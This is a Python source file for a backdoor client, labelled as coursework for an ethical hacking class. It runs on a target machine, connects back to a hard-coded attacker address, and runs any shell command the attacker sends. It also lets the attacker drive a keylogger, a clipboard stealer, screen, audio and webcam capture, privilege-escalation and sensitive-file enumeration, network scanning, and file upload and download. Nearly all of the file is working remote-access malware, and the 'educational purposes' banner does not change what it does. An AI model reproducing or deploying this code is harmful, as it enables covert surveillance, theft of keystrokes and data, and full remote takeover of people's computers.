################################################
# Backdoor Client (Target Machine)             #
# Class: DES484 Ethical Hacking                #
# WARNING: For Educational Purposes Only!      #
#                                              #
# USAGE: Run this on the TARGET machine        #
# This will connect back to the attacker       #
################################################

# Import necessary Python modules
import socket
import time
import subprocess
import json
import os
import sys

# Import feature modules (with fallback if not available)
try:
    from features.keylogger import Keylogger, FallbackKeylogger, PYNPUT_AVAILABLE
    from features.privilege_escalation import PrivilegeEscalation
    from features.media_capture_tool import ScreenCapture, AudioCapture, WebcamCapture, ScreenRecorder
    from features.network_discovery import NetworkDiscovery
    from features.clipboard_stealer import ClipboardStealer, FallbackClipboardStealer, PYPERCLIP_AVAILABLE
    FEATURES_AVAILABLE = True
except ImportError:
    FEATURES_AVAILABLE = False
    print("[!] Feature modules not found. Some features will be unavailable.")


class BackdoorClient:
    """Backdoor client with advanced features"""
    
    def __init__(self, host='192.168.0.100', port=5555):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Initialize feature modules
        if FEATURES_AVAILABLE:
            self.keylogger = Keylogger() if PYNPUT_AVAILABLE else FallbackKeylogger()
            self.priv_esc = PrivilegeEscalation()
            self.screen_capture = ScreenCapture()
            self.audio_capture = AudioCapture()
            self.webcam_capture = WebcamCapture()
            self.screen_recorder = ScreenRecorder()
            self.network_discovery = NetworkDiscovery()
            self.clipboard_stealer = ClipboardStealer() if PYPERCLIP_AVAILABLE else FallbackClipboardStealer()
        else:
            self.keylogger = None
            self.priv_esc = None
            self.screen_capture = None
            self.audio_capture = None
            self.webcam_capture = None
            self.screen_recorder = None
            self.network_discovery = None
            self.clipboard_stealer = None
    
    def reliable_send(self, data):
        """Send data in a reliable way (encoded as JSON)"""
        try:
            jsondata = json.dumps(data)
            self.socket.send(jsondata.encode())
        except Exception as e:
            print(f"[!] Error sending data: {e}")
    
    def reliable_recv(self):
        """Receive data in a reliable way (expects JSON data)"""
        data = ''
        while True:
            try:
                data = data + self.socket.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue
            except Exception as e:
                print(f"[!] Error receiving data: {e}")
                return None
    
    def upload_file(self, file_name):
        """Upload a file to the attacker"""
        try:
            with open(file_name, 'rb') as f:
                self.socket.send(f.read())
        except Exception as e:
            self.reliable_send(f"Error uploading file: {str(e)}")
    
    def download_file(self, file_name):
        """Download a file from the attacker"""
        try:
            with open(file_name, 'wb') as f:
                self.socket.settimeout(1)
                chunk = self.socket.recv(1024)
                while chunk:
                    f.write(chunk)
                    try:
                        chunk = self.socket.recv(1024)
                    except socket.timeout:
                        break
                self.socket.settimeout(None)
        except Exception as e:
            self.reliable_send(f"Error downloading file: {str(e)}")
    
    def handle_command(self, command):
        """Handle received commands with enhanced features"""
        try:
            # Basic commands
            if command == 'quit':
                return 'quit'
            
            elif command == 'clear':
                return 'continue'
            
            elif command[:3] == 'cd ':
                try:
                    os.chdir(command[3:])
                    self.reliable_send(f"Changed directory to: {os.getcwd()}")
                except Exception as e:
                    self.reliable_send(f"Error: {str(e)}")
                return 'continue'
            
            elif command[:8] == 'download':
                self.upload_file(command[9:])
                return 'continue'
            
            elif command[:6] == 'upload':
                self.download_file(command[7:])
                return 'continue'
            
            # Enhanced Features
            elif command == 'help_advanced':
                self.send_advanced_help()
                return 'continue'
            

            # Keylogger commands

            # start keylogger
            elif command == 'keylog_start':
                if self.keylogger:
                    result = self.keylogger.start()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # stop keylogger
            elif command == 'keylog_stop':
                if self.keylogger:
                    result = self.keylogger.stop()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # dump keylogger logs and download file
            elif command == 'keylog_dump':
                if self.keylogger:
                    # First, save any buffered content
                    if hasattr(self.keylogger, 'save_log'):
                        self.keylogger.save_log()
                    
                    # Get the log file path
                    log_file = self.keylogger.log_file
                    
                    # Check if log file exists and has content
                    if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
                        # Send confirmation message
                        self.reliable_send(f"Keylog file ready: {log_file}")
                        # Automatically upload the file to attacker
                        self.upload_file(log_file)
                    else:
                        self.reliable_send("No keylog file found or file is empty")
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # clear keylogger logs
            elif command == 'keylog_clear':
                if self.keylogger:
                    result = self.keylogger.clear_logs()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # manual log (fallback keylogger)
            elif command.startswith('keylog_manual'):
                if self.keylogger:
                    parts = command.split(' ', 1)
                    if len(parts) > 1:
                        text = parts[1]
                        result = self.keylogger.log_manual(text)
                        self.reliable_send(result)
                    else:
                        self.reliable_send("Usage: keylog_manual <text to log>")
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # check keylogger status
            elif command == 'keylog_status':
                if self.keylogger:
                    status = self.keylogger.get_status()
                    self.reliable_send(json.dumps(status, indent=2))
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # Privilege escalation commands
            elif command == 'priv_check':
                if self.priv_esc:
                    status = self.priv_esc.get_status()
                    self.reliable_send(json.dumps(status, indent=2))
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            elif command == 'priv_enum':
                if self.priv_esc:
                    result = f"""
                    === Privilege Enumeration === {self.priv_esc.check_suid_binaries()}
                    === Sudo Opportunities === {self.priv_esc.find_sudo_opportunities()}
                    === Kernel Version === {self.priv_esc.check_kernel_version()}"""
                    self.reliable_send(result)
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            elif command == 'priv_services':
                if self.priv_esc:
                    result = self.priv_esc.enumerate_services()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            elif command == 'priv_tasks':
                if self.priv_esc:
                    result = self.priv_esc.check_scheduled_tasks()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            elif command == 'priv_sensitive':
                if self.priv_esc:
                    result = self.priv_esc.find_sensitive_files()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            

            # Screen capture commands

            # single screenshot
            elif command == 'screenshot':
                if self.screen_capture:
                    result = self.screen_capture.capture_screenshot()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen capture feature not available")
                return 'continue'
            
            # multi screenshot
            elif command.startswith('screenshot_multi'):
                if self.screen_capture:
                    parts = command.split()
                    count = int(parts[1]) if len(parts) > 1 else 5
                    interval = int(parts[2]) if len(parts) > 2 else 2
                    result = self.screen_capture.capture_multiple(count, interval)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen capture feature not available")
                return 'continue'
            
            # list screenshots
            elif command == 'screenshot_list':
                if self.screen_capture:
                    result = self.screen_capture.list_screenshots()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen capture feature not available")
                return 'continue'
            

            # Audio capture commands

            # record audio
            elif command.startswith('audio_record'):
                if self.audio_capture:
                    parts = command.split()
                    duration = int(parts[1]) if len(parts) > 1 else 10
                    result = self.audio_capture.record_audio(duration)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Audio capture feature not available")
                return 'continue'
            
            # stop audio recording
            elif command == 'audio_stop':
                if self.audio_capture:
                    result = self.audio_capture.stop_audio()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Audio capture feature not available")
                return 'continue'
            
            # list audio recordings
            elif command == 'audio_list':
                if self.audio_capture:
                    result = self.audio_capture.list_recordings()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Audio capture feature not available")
                return 'continue'
            

            # Screen recording commands

            # record screen
            elif command.startswith('record_screen'):
                if self.screen_recorder:
                    parts = command.split()
                    duration = int(parts[1]) if len(parts) > 1 else 10
                    fps = int(parts[2]) if len(parts) > 2 else 15
                    result = self.screen_recorder.record_screen(duration=duration, fps=fps)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen recording feature not available")
                return 'continue'
            
            # background screen recording commands
            elif command == 'record_start':
                if self.screen_recorder:
                    parts = command.split()
                    max_duration = int(parts[1]) if len(parts) > 1 else 3600
                    result = self.screen_recorder.start_background_recording(max_duration=max_duration)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen recording feature not available")
                return 'continue'
            
            # stop background recording
            elif command == 'record_stop':
                if self.screen_recorder:
                    result = self.screen_recorder.stop_recording()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen recording feature not available")
                return 'continue'
            
            # check recording status
            elif command == 'record_status':
                if self.screen_recorder:
                    result = self.screen_recorder.get_recording_status()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen recording feature not available")
                return 'continue'
            
            # list screen recordings
            elif command == 'record_list':
                if self.screen_recorder:
                    result = self.screen_recorder.list_recordings()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen recording feature not available")
                return 'continue'
            

            # Webcam capture commands

            # capture webcam image  
            elif command == 'webcam_snap':
                if self.webcam_capture:
                    result = self.webcam_capture.capture_image()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Webcam capture feature not available")
                return 'continue'
            
            # list webcam images
            elif command == 'webcam_list':
                if self.webcam_capture:
                    result = self.webcam_capture.list_images()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Webcam capture feature not available")
                return 'continue'

            # Network discovery commands

            # network information
            elif command == 'net_info':
                if self.network_discovery:
                    info = self.network_discovery.get_network_info()
                    result = json.dumps(info, indent=2)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'
            
            # scan local network
            elif command == 'net_scan':
                if self.network_discovery:
                    result = self.network_discovery.discover_local_network()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'
            
            # active connections
            elif command == 'net_connections':
                if self.network_discovery:
                    result = self.network_discovery.get_active_connections()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'
            
            # port scan host
            elif command.startswith('net_portscan'):
                if self.network_discovery:
                    parts = command.split()
                    if len(parts) > 1:
                        host = parts[1]
                        result = self.network_discovery.scan_common_ports(host)
                        self.reliable_send(f"Open ports on {host}: {result}")
                    else:
                        self.reliable_send("Usage: net_portscan <host>")
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'

            # network public IP
            elif command == 'net_public_ip':
                if self.network_discovery:
                    result = self.network_discovery.get_public_ip()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'
            
            # check internet connectivity
            elif command == 'net_check_internet':
                if self.network_discovery:
                    result = self.network_discovery.check_internet_connectivity()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'
            
            # Clipboard stealer commands
            
            # start clipboard monitoring
            elif command == 'clipboard_start':
                if self.clipboard_stealer:
                    result = self.clipboard_stealer.start()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # stop clipboard monitoring
            elif command == 'clipboard_stop':
                if self.clipboard_stealer:
                    result = self.clipboard_stealer.stop()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # get clipboard status
            elif command == 'clipboard_status':
                if self.clipboard_stealer:
                    status = self.clipboard_stealer.get_status()
                    self.reliable_send(json.dumps(status, indent=2))
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # get latest clipboard content
            elif command == 'clipboard_get':
                if self.clipboard_stealer:
                    result = self.clipboard_stealer.get_latest_clipboard()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # set clipboard content
            elif command.startswith('clipboard_set '):
                if self.clipboard_stealer:
                    content = command[14:]  # Remove 'clipboard_set '
                    result = self.clipboard_stealer.set_clipboard(content)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # dump clipboard logs
            elif command == 'clipboard_dump':
                if self.clipboard_stealer:
                    log_file = self.clipboard_stealer.log_file
                    
                    # Check if log file exists and has content
                    if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
                        # Send confirmation message
                        self.reliable_send(f"Clipboard log file ready: {log_file}")
                        # Automatically upload the file to attacker
                        self.upload_file(log_file)
                    else:
                        self.reliable_send("No clipboard log file found or file is empty")
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # clear clipboard logs
            elif command == 'clipboard_clear':
                if self.clipboard_stealer:
                    result = self.clipboard_stealer.clear_logs()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # list clipboard log files
            elif command == 'clipboard_list':
                if self.clipboard_stealer:
                    result = self.clipboard_stealer.list_logs()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # System information
            elif command == 'sysinfo':
                result = self.get_system_info()
                self.reliable_send(result)
                return 'continue'
            
            # Default: execute as shell command
            else:
                execute = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                self.reliable_send(result)
                return 'continue'
        
        except Exception as e:
            self.reliable_send(f"Error executing command: {str(e)}")
            return 'continue'

    # Send advanced help information
    def send_advanced_help(self):
        """Send help information about advanced features"""
        help_text = """
        === Enhanced Backdoor Commands ===

        BASIC COMMANDS:
        help_advanced        - Show this help message
        sysinfo             - Display system information
        cd <dir>            - Change directory
        download <file>     - Download file from target
        upload <file>       - Upload file to target
        quit                - Exit backdoor

        KEYLOGGER:
        keylog_start        - Start keylogger
        keylog_stop         - Stop keylogger
        keylog_dump         - Download keylog file (saved as keylog_dump_TIMESTAMP.txt)
        keylog_clear        - Clear keylog file
        keylog_status       - Check keylogger status
        keylog_manual <text> - Manually log text (fallback mode)

        PRIVILEGE ESCALATION:
        priv_check          - Check current privileges
        priv_enum           - Enumerate privilege escalation vectors
        priv_services       - List running services
        priv_tasks          - List scheduled tasks
        priv_sensitive      - Find sensitive files

        SCREEN & MEDIA:
        screenshot          - Capture single screenshot
        screenshot_multi <count> <interval> - Capture multiple screenshots
        screenshot_list     - List captured screenshots
        audio_record <sec>  - Record audio (default 10 seconds)
        audio_list          - List audio recordings
        record_screen <sec> <fps> - Record screen (default 10s, 15fps)
        record_start <max>  - Start background recording (max duration in seconds)
        record_stop         - Stop background recording
        record_status       - Check recording status
        record_list         - List screen recordings
        webcam_snap         - Capture webcam image

        NETWORK DISCOVERY:
        net_info            - Display network information
        net_scan            - Scan local network for hosts
        net_connections     - Show active network connections
        net_portscan <host> - Scan common ports on host
        net_public_ip       - Get public IP address
        net_check_internet  - Check internet connectivity

        CLIPBOARD STEALER:
        clipboard_start     - Start monitoring clipboard
        clipboard_stop      - Stop monitoring clipboard
        clipboard_status    - Check clipboard monitor status
        clipboard_get       - Get current clipboard content
        clipboard_set <text> - Set clipboard content
        clipboard_dump      - Download clipboard log file
        clipboard_clear     - Clear clipboard logs
        clipboard_list      - List all clipboard log files

        Note: Some features require additional libraries (pynput, PIL, pyaudio, opencv-python, pyperclip)
        """
        self.reliable_send(help_text)
    
    # get system information
    def get_system_info(self):
        """Gather comprehensive system information"""
        import platform
        
        info = f"""
            === System Information ===
            Hostname: {socket.gethostname()}
            System: {platform.system()}
            Release: {platform.release()}
            Version: {platform.version()}
            Machine: {platform.machine()}
            Processor: {platform.processor()}
            Python: {platform.python_version()}
            Current Directory: {os.getcwd()}
            Current User: {os.getenv('USER') or os.getenv('USERNAME')}
            """
        if self.network_discovery:
            info += f"\nLocal IP: {self.network_discovery.local_ip}"
        
        if self.priv_esc:
            info += f"\nPrivileged: {self.priv_esc.is_admin}"
        
        return info

    # Main shell function for command execution
    def shell(self):
        """Main shell function for command execution"""
        while True:
            command = self.reliable_recv()
            if command is None:
                break
            
            result = self.handle_command(command)
            if result == 'quit':
                break

    # Establish connection to attacker machine (reverse shell)
    def connection(self):
        """Establish connection to attacker machine (reverse shell)"""
        while True:
            time.sleep(20)  # Wait before reconnecting
            try:
                print(f"[*] Attempting to connect to {self.host}:{self.port}...")
                self.socket.connect((self.host, self.port))
                print("[+] Connection established!")
                self.shell()
                self.socket.close()
                break
            except Exception as e:
                print(f"[!] Connection failed: {e}")
                print("[*] Retrying...")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Main execution
if __name__ == "__main__":
    print("=" * 70)
    print("  Enhanced Backdoor Client - TARGET SIDE")
    print("  This program connects BACK to the attacker's server")
    print("  WARNING: For Educational Purposes Only!")
    print("=" * 70)
    
    # Configuration - Change these to match your attacker machine
    ATTACKER_HOST = '192.168.0.107'  # Change to attacker's IP address
    ATTACKER_PORT = 5556            # Must match port in server.py
    
    print(f"\n[*] Configured to connect to: {ATTACKER_HOST}:{ATTACKER_PORT}")
    print("[*] Starting connection attempts...")
    print("=" * 70)
    
    # Create and start backdoor client
    client = BackdoorClient(ATTACKER_HOST, ATTACKER_PORT)
    client.connection()
